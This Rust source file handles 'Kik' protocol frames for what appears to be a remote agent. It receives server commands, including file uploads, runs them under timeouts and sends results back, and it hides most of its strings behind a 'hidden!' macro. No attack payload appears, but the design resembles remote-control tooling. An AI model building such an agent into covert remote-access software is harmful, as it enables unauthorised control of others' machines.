use crate::cmd_runner;
use crate::context::{Context, COMMAND_SENDER};
use bytes::BytesMut;
use common::channel::Channel;
use common::command::Command;
use common::file_util::LONG_COMMAND_TIMEOUT;
use common::hidden;
use common::message::init_frame::InitFrame;
use common::message::kik_frame::KikFrame;
use common::message::kik_resp::kik_error;
use common::protocol;
use common::protocol::{BufSerializable, CmdOptions};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::mpsc::Sender;
use tokio::sync::Mutex;
use tokio::time::timeout;

fn default_error() -> anyhow::Error {
    anyhow::Error::msg(hidden!("不支持的帧类型"))
}

pub async fn handle_kik(
    context: &Context,
    channel: Arc<Mutex<Channel>>,
    msg: BytesMut,
) -> anyhow::Result<()> {
    let frame = KikFrame::from_buf(msg).ok_or_else(|| anyhow::Error::msg(hidden!("帧格式错误")))?;
    match frame {
        //控制过程应由单独线程处理，不阻塞连接主线程,与ping pong分开
        KikFrame::Cmd(req_cmd) => {
            let command = req_cmd.split();
            let upload_data_id = match &command.2 {
                Command::Ctrl(common::command::CtrlCommand::SetFile(id, _))
                | Command::Ctrl(common::command::CtrlCommand::SetBigFile(id, _, _, _)) => {
                    Some(id.clone())
                }
                _ => None,
            };
            if let Some(data_id) = upload_data_id.as_deref() {
                context.register_data_route(data_id).await?;
            }
            let send_result = channel
                .lock()
                .await
                .attribute(&COMMAND_SENDER)
                .cloned()
                .ok_or_else(|| anyhow::Error::msg(hidden!("命令处理队列未初始化")))?
                .send(command)
                .await;
            if send_result.is_err() {
                if let Some(data_id) = upload_data_id.as_deref() {
                    context.remove_data_route(data_id).await;
                }
                return Err(anyhow::Error::msg(hidden!("命令处理线程已关闭")));
            }
        }
        KikFrame::Ping => {}
        KikFrame::Pong => {}
        _ => {
            return Err(default_error());
        }
    }
    Ok(())
}

pub async fn handle_kik_cmd(
    context: Context,
    channel: &Arc<Mutex<Channel>>,
    cmd_id: String,
    cmd_options: CmdOptions,
    cmd: Command,
) {
    let upload_data_id = match &cmd {
        common::command::Command::Ctrl(common::command::CtrlCommand::SetFile(id, _))
        | common::command::Command::Ctrl(common::command::CtrlCommand::SetBigFile(id, _, _, _)) => {
            Some(id.clone())
        }
        _ => None,
    };
    dev_debug!("Running command: {:?}", cmd);
    let run_timeout = if cmd_options.timeout() {
        Duration::from_secs(60 * 5)
    } else {
        LONG_COMMAND_TIMEOUT
    };
    let outcome = timeout(run_timeout, cmd_runner::run(&context, cmd))
        .await
        .unwrap_or_else(|_| {
            cmd_runner::RunOutcome::immediate(kik_error(hidden!("Kik执行任务超时")))
        });
    let (resp, transfer_start) = outcome.split();
    if let Some(data_id) = upload_data_id {
        context.remove_data_route(&data_id).await;
    }
    dev_debug!("开始响应:{:?},cmd_id:{}", resp, cmd_id);
    let suc = channel
        .lock()
        .await
        .write_and_flush(&protocol::transfer_encode_frame(KikFrame::RespExtra(
            resp, cmd_id,
        )))
        .await;
    //当发送失败
    if suc.is_err() {
        channel.lock().await.try_write_half_close().await;
    } else if let Some(start) = transfer_start {
        // 只有 data_id 响应成功写出后才放行大文件数据，建立明确的生产者/消费者时序。
        let _ = start.send(());
    }
    dev_debug!("响应结束");
}

pub async fn handle_kik_data(
    context: &Context,
    _channel: Arc<Mutex<Channel>>,
    msg: BytesMut,
) -> anyhow::Result<()> {
    let frame = KikFrame::from_buf(msg).ok_or_else(|| anyhow::Error::msg(hidden!("帧格式错误")))?;
    match frame {
        KikFrame::Data(id, data) => {
            dev_debug!("得到长度为{}的数据", data.len());
            if let Err(_error) = context.send_data((id, data)).await {
                dev_debug!("向接收通道发送数据失败,error:{}", _error);
            }
        }
        KikFrame::Ping => {}
        KikFrame::Pong => {}
        _ => {
            return Err(default_error());
        }
    }
    Ok(())
}

pub async fn handle_init_message(
    _context: &Context,
    _channel: Arc<Mutex<Channel>>,
    msg: BytesMut,
    tx: &mut Sender<String>,
) -> anyhow::Result<()> {
    //由于服务端延迟发ping 所以还未初始化完成的kik连接 一般不会收到服务器的 KikFrame::Ping
    let frame =
        InitFrame::from_buf(msg).ok_or_else(|| anyhow::Error::msg(hidden!("帧格式错误")))?;
    match frame {
        InitFrame::KikId(id) => {
            tx.send(id)
                .await
                .map_err(|_| anyhow::Error::msg(hidden!("初始化响应接收任务已关闭")))?;
        }
        _frame => {
            return Err(default_error());
        }
    }
    Ok(())
}
